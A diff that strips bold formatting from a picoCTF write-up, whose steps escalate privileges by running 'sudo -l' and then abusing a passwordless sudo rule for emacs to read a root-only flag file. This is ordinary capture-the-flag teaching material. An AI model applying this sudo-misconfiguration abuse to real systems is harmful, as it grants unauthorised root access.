@@ -5,7 +5,7 @@
 
 ## Solution
 
-**First we have to login with SSH.**
+First we have to login with SSH.
 
 ```shell
 ssh -p 53351 ctf-player@green-hill.picoctf.net
@@ -16,7 +16,7 @@ ssh -p 53351 ctf-player@green-hill.picoctf.net
 ls -lh flag.txt
 ```
 
-**This shows that only `root` can read the file. So let's check the `sudo` permissions.**
+This shows that only `root` can read the file. So let's check the `sudo` permissions.
 
 ```shell
 sudo -l
@@ -27,7 +27,7 @@ User ctf-player may run the following commands on challenge: (ALL)
 NOPASSWD: /bin/emacs
 ```
 
-**This means the user can run `Emacs` as root without password.**
+This means the user can run `Emacs` as root without password.
 
 ```shell
 sudo emacs flag.txt
